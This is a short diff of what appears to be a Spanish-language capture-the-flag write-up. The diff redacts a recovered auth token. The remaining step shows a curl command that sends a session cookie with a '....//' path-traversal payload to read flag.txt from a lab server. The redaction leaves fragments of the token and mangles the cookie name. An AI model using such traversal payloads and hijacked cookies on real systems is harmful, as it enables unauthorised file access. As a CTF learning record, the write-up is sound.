@@ -167,13 +167,13 @@ print(f"Token: {token_found}")
 
 **Output:**
 ```
-Token: 002b984fb369ac735a69183883be75d88354b586306574fca375ce060bc5f764
+Token: SECRET_REDACTED_BY_ANTIGRAVITY306574fca375ce060bc5f764
 ```
 
 ### Paso 2: Path Traversal para Leer Flag
 
 ```bash
-curl -b "santa_auth=002b984fb369ac735a69183883be75d88354b586306574fca375ce060bc5f764" \
+curl -b "santa_SECRET_REDACTED_BY_ANTIGRAVITY4b586306574fca375ce060bc5f764" \
      "http://154.57.164.82:32249/admin/notes/read?id=....//....//....//flag.txt"
 ```
 
